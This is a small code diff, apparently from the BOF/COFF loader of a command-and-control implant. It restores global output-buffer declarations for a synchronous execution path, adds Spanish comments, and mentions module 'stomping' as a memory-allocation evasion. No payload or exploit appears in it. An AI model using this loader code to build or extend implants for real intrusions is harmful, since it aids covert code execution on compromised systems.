@@ -83,7 +83,11 @@ typedef struct COF_SYMBOL {
 
 #pragma pack(pop)
 
-// InitBofOutputData() removed — sync BOFs use tls_CurrentBofContext now.
+// Globals para el path síncrono (mismo esquema que el original).
+// El path async usa ctx->outputBuffer via tls_CurrentBofContext en su hilo.
+extern Packer* bofOutputPacker;
+extern ULONG   bofTaskId;
+void InitBofOutputData();
 
 // stompCtx is NULL when stomping is disabled or when BofStompCreate failed
 // (caller falls back to VirtualAlloc automatically).
